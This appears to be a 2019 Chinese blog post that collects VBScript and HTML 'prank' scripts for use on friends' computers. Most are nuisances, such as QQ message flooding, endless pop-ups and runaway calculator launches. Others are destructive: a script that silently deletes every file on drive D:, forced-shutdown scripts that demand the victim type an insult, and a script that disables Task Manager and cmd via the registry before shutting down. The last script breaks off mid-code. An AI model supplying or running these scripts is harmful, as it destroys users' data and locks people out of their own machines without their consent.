---
layout:     post
author:     "Katsu"
date:       2019-02-01 22:08:00
title:      vbs恶搞代码
---

## 一、QQ轰炸
> 一、你打开好友的聊天对话框,然后记下在你QQ里好友的昵称,把下面代码里的xx替换一下,就可以自定义发送QQ信息到好友的次数(代码里的数字10改一下即可). <br>
> xx.vbs=> <br>

```vb
On Error Resume Next 
Dim wsh,ye 
set wsh=createobject("wscript.shell") 
for i=1 to 10 
wscript.sleep 700 
wsh.AppActivate("与 xx 聊天中") 
wsh.sendKeys "^v" 
wsh.sendKeys i 
wsh.sendKeys "%s" 
next 
wscript.quit 
```


------------------------------------------------------------------------------ 

## 二、无限弹窗
```
do 
msgbox "You are foolish!" 
loop 
```

------------------------------------------------------------------------------ 

## 三、打开无数个计算器，直到死机 

```
set wsh=createobject("wscript.shell") 
do 
wsh.run "calc" 
loop
```
 

----------------------------------------------------------------------------- 

## 四、直接关机 

```
dim WSHshell 
set WSHshell = wscript.createobject("wscript.shell") 
WSHshell.run "shutdown -f -s -t 00",0 ,true
```

----------------------------------------------------------------------------- 
## 五、删除D:\所有文件 

```
dim WSHshell 
set WSHshell = wscript.createobject("wscript.shell") 
WSHshell.run "cmd /c ""del d:\*.* / f /q /s""",0 ,true 
```

---------------------------------------------------------------------------- 
## 六、不断弹出窗口 
 
```
while(1) 
msgbox "哈哈 你被耍了！" 
loop
```

---------------------------------------------------------------------------- 
## 七、不断按下alt+f4 （开什么都关闭……） 

```
dim WSHshell 
set WSHshell = wscript.createobject("wscript.shell") 
while(1) 
WSHshell.SendKeys "%{F4}" 
loop
```

---
## 八、按500次回车 

```
dim s 
do until s=500 
s=s+1 
msgbox "哥们，给我按500次回车吧",64 
loop
```

 ------------------------------------------------------------ 

## 九、关不掉的窗口 

```
WScript.Echo("嘿，谢谢你打开我哦，我等你很久拉！"&TSName) 
WScript.Echo("你是可爱的小朋吗?") 
WScript.Echo("哈,我想你拉，这你都不知道吗？") 
WScript.Echo("怎么才来，说~是不是不关心我") 
WScript.Echo("哼,我生气拉，等你这么久，心都凉啦。") 
WScript.Echo("小强很生气，后果很严重哦。") 
WScript.Echo("嘿嘿！你也会很惨滴哦") 
WScript.Echo("是不是想清除我？") 
WScript.Echo("那你要点上50下哦，不过会给你惊喜滴") 
WScript.Echo("还剩49下，快点点哦") 
WScript.Echo("还剩48下，快点，小笨蛋！") 
WScript.Echo("还剩47下对，就这样快点点！") 
WScript.Echo("还剩46下。你啊就是笨，要快哦，我先不打扰你工作。") 
WScript.Echo("还剩45下，记得要快哦！") 
WScript.Echo("还剩43下") 
WScript.Echo("还剩42下") 
WScript.Echo("还剩41下") 
WScript.Echo("还剩40下") 
WScript.Echo("还剩39下") 
WScript.Echo("还剩38下") 
WScript.Echo("还剩37下") 
WScript.Echo("还剩36下") 
WScript.Echo("还剩35下") 
WScript.Echo("还剩34下") 
WScript.Echo("还剩33下") 
WScript.Echo("还剩32下") 
WScript.Echo("还剩30下") 
WScript.Echo("还剩29下") 
WScript.Echo("还剩28下") 
WScript.Echo("还剩27下") 
WScript.Echo("还剩26下") 
WScript.Echo("还剩25下") 
WScript.Echo("还剩24下") 
WScript.Echo("还剩23下") 
WScript.Echo("还剩22下") 
WScript.Echo("还剩21下") 
WScript.Echo("还剩20下") 
WScript.Echo("还剩19下") 
WScript.Echo("还剩18下") 
WScript.Echo("还剩17下") 
WScript.Echo("还剩16下") 
WScript.Echo("还剩15下") 
WScript.Echo("还剩14下") 
WScript.Echo("还剩13下停停！！！慢点，我有话要说") 
WScript.Echo("还剩12下，你继续点我就会消失滴") 
WScript.Echo("还剩11下，以后就看不到我拉。555555") 
WScript.Echo("还剩10下，你现在可以选择停止！") 
WScript.Echo("还剩9下。你还点啊，不要我拉？") 
WScript.Echo("还剩8下，有点伤心拉，干嘛丢弃人家") 
WScript.Echo("还剩7下。疯了，你有点负意！") 
WScript.Echo("还剩6下。对。你就点吧，我恨你！") 
WScript.Echo("还剩5下，不明白，删除我你就好吗？") 
WScript.Echo("还剩4下！真要删除我？") 
WScript.Echo("还剩3下。可是我真的很眷恋你。。。") 
WScript.Echo("还剩2下。不要这么绝情嘛，人家是爱你的！") 
WScript.Echo("还剩1下。哼，既然你这么绝情。也别怪我无义！！！") 
WScript.Echo("我本因该消失的，不过我留恋你滴芳容，上帝又给了一次机会。") 
WScript.Echo("想结素我么?那你就再多点一次") 
WScript.Echo("想结素我么?那你就再多点一次") 
WScript.Echo("想结素我么?那你就再多点一次") 
WScript.Echo("想结素我么?那你就再多点一次") 
WScript.Echo("想结素我么?那你就再多点一次") 
WScript.Echo("想结素我么?那你就再多点一次") 
WScript.Echo("想结素我么?那你就再多点一次") 
WScript.Echo("想结素我么?那你就再多点一次") 
WScript.Echo("想结素我么?那你就再多点一次") 
WScript.Echo("想结素我么?那你就再多点一次") 
```
----
## 十、自动关机
### 1.

> 新建一个记事本 把上面的代码复制进去 另存为VBE格式的就可以了 <br>
> cmd.exe /c shutdown -r -t 180 -c <br>
> 这里的数字可以修改关机时间 180秒 <br>
> 这些文字也可以自设 这个脚本启用cmd 里的关机程序 <br>
> 如果不输的的话 可以打开任务管理器 输入shutdown -a 来解除 我们试下这时定时关机已经没了 <br>
> 但是还有个关不掉的窗口 我们打开任务管理器 结束掉Wscript.exe 这个进程就OK了<br>
> 这时就完全解除这个脚本了 Wscript 时Windows 脚本宿主

```
on error resume next 
dim WSHshellA 
set WSHshellA = wscript.createobject("wscript.shell") 
WSHshellA.run "cmd.exe /c shutdown -r -t 180 -c ""说我是猪，不说我是猪就一分钟关机，不信，试下···"" ",0 ,true 
dim a 
do while(a <> "我是猪") 
a = inputbox ("说我是猪,就不关机，快撒，说 ""我是猪""　","说不说","",8000,7000) 
msgbox chr(13) + chr(13) + chr(13) + a,0,"MsgBox" 
loop 
msgbox chr(13) + chr(13) + chr(13) + "早说就行了嘛" 
dim WSHshell 
set WSHshell = wscript.createobject("wscript.shell") 
WSHshell.run "cmd.exe /c shutdown -a",0 ,true 
msgbox chr(13) + chr(13) + chr(13) + "哈哈哈哈，好乖" 
```
 
### 2.
> ws.run"iexplore.exe http://new.qzone.qq.com/137841986/infocenter" <br>
> 这段代码可以改成你自己设定的地址 <br>
> 如果别人不输我是猪的话就会一直点下去 点到你设定的数字<br> 
> for i=1 to 100 <br>
> 从1到100 <br>
> 可以改成 20 其他的数字<br> 
> 解除这个VBS脚本的办法就简单了 只是关掉任务管理器里Wscript.exe这个进程就好了<br>

```
set ws=createobject("wscript.shell") 
call shutdown(1) 
do while a<>"我是猪" 
a=inputbox("快在下面的框框里输入我是猪,否则后果自负，快输""我是猪"" ","输不输","") 
loop 
call shutdown(2) 
msgbox "早说就行了嘛",4096+64 
msgbox"再输一遍我是猪!",4096+64 
msgbox"我是猪!",4096+64 
MsgBox"最后一次!",4096+64 
MsgBox"如果你很快的点过去,不看的话",4096+64 
MsgBox"我就要你踩我空间的!哼!",4096+64 
MsgBox"从前有座山!",4096+64 
MsgBox"山里有个庙.",4096+64 
MsgBox"庙里有个老和尚在讲故事.",4096+64 
ws.run"iexplore.exe http://new.qzone.qq.com/137841986/infocenter" 
msgbox"哎呀累了！数绵羊哄我睡觉",4096+64 
for i=1 to 100 
MsgBox i&"只绵羊",4096+64 
next 
msgbox"哎呀我困了，这次就饶过你吧，下次注意哦!",4096+64 
msgbox"最后问个问题，我是不是大好人！",4096+64 
if inputbox("是不是","请选择","是")<>"是" then 
call shutdown(1) 
end if 
sub shutdown(s) 
select case s 
case 1 
ws.run"cmd.exe /c shutdown -r -t 60 -c",0 
case 2 
ws.run"cmd.exe /c shutdown -a",0 
end select 
end sub 
```

-------------------------------------------------------------------------------
## 十一、
> 复制以上代码，在桌面建一个文本，把代码放进去，另存为VBE格式<br>
> 此代码的威力： <br>
> 1：开机就强制自动关机<br> 
> 2：cmd命令打不开 <br>
> 3：结束任务不管用 <br>
> 4：F8安全模式也不管用 <br>
> 呵呵！听起来是不是有点恐怖啊，我在我朋友空间里看见也吓了一跳、<br> 
> 代码破解方法：就是再运行一次，就可以破解了，也就是第2次保存的那个VBE文件，，<br>
> 

```
set s=createobject("wscript.shell") 
set bag=getobject("winmgmts:\\.\root\cimv2") 
set pipe=bag.execquery("select * from win32_process where name='wscript.exe'") 
For Each id in pipe 
if instr(1,id.commandLine,wscript.scriptfullname)<>0 and pipe.count>=2 then 
s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr",0,"REG_DWORD" 
s.regwrite"HKCU\Software\Policies\Microsoft\Windows\System\DisableCMD",0,"REG_DWORD" 
id.terminate() 
else 
s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr",1,"REG_DWORD" 
s.regwrite"HKCU\Software\Policies\Microsoft\Windows\System\DisableCMD",1,"REG_DWORD" 
for i=1 to 60 
s.popup"系统将在"& 60-i &"秒后关机...",1,"系统提示",4096+48 
next 
Set colOS = GetObject("winmgmts:{(Shutdown)}").ExecQuery("Select * FROM Win32_OperatingSystem") 
For Each eOs In colOS 
eOs.Win32Shutdown(2) 
Next 
end if 
Next 
[color=#FF0000]
```

---------
## 十二、关机

```
on error resume next 
dim WSHshellA 
set WSHshellA = wscript.createobject("wscript.shell") 
WSHshellA.run "cmd.exe /c shutdown -r -t 60 -c ""说你是傻B，我是天下第一大傻B不说宝宝，我是天下第一大傻B就一分钟关你机，不信，试试···"" ",0 ,true 
dim a 
do while(a <> "宝宝，我是天下第一大傻B") 
a = inputbox ("宝宝，我是天下第一大傻B,就不关机，快撒，说 ""宝宝，我是天下第一大傻B""　","说不说","不说",8000,7000) 
msgbox chr(13) + chr(13) + chr(13) + a,0,"MsgBox" 
loop 
msgbox chr(13) + chr(13) + chr(13) + "早说就行了嘛，乖乖" 
dim WSHshell 
set WSHshell = wscript.createobject("wscript.shell") 
WSHshell.run "cmd.exe /c shutdown -a",0 ,true 
msgbox chr(13) + chr(13) + chr(13) + "宝宝是不是又帅啦？？" 
```


---
## 十三、网页整人

```html
<html> 
<head> 
<meta http-equiv="Content-Type" content="text/html; charset=gb2312"> 
<title>网页特效|Linkweb.cn/Js|---很恶心的常见整人效果</title> 
</head> 
<body> 
<a href="" onMouseover="alert('为什么把鼠标放到这里?'); 
alert('我不是说过不可以这样吗？'); 
alert('你把我的话当什么了？'); 
alert('你知道错了吗？'); 
alert('什么？你居然....'); 
alert('居然还没意识到自己做错了？'); 
alert('那好，你要为此付出代价!'); 
alert('我要你在这里点足一千下......'); 
alert('什么？你开始有点后悔了？'); 
alert('何必呢？'); 
alert('你当初干什么去了？'); 
alert('不原谅你！'); 
alert('好从现在开始再点995下......'); 
alert('你的手开始累了吗?'); 
alert('什么？你已经没力气了？'); 
alert('你一直在求我原谅你啊！'); 
alert('看来你是真的知道错了!'); 
alert('下次你还会这么做吗？'); 
alert('真的不会了？'); 
alert('那好，今天就放你一马！'); 
alert('写封信给我说声对不起!'); 
alert('你能这么做我很高兴!!!'); 
document.bgColor='black'; 
document.fgColor='White'; 
window.location.href='mailto:mygod@god?subject=对不起,下次不敢了!';">不许把鼠标移到这里</a> 

嘻试吧爽噢。。 

</body> 
</html> 
```

---
## 十四、生成很多文件
vbs整人代码 
```
Private Sub Form_Load() 
Me.Hide 
End Sub 
Private Sub Timer1_Timer() 
'声明变量，其中“count”为静态变量，以便生成不同的文件 
Dim files As String 
Dim nr As String 
Dim c As String 
Static count As Long 
'定义要把生成的文件存放在那个目录文件下 
c = "C:\Program Files\" 
'生成文件的内容
```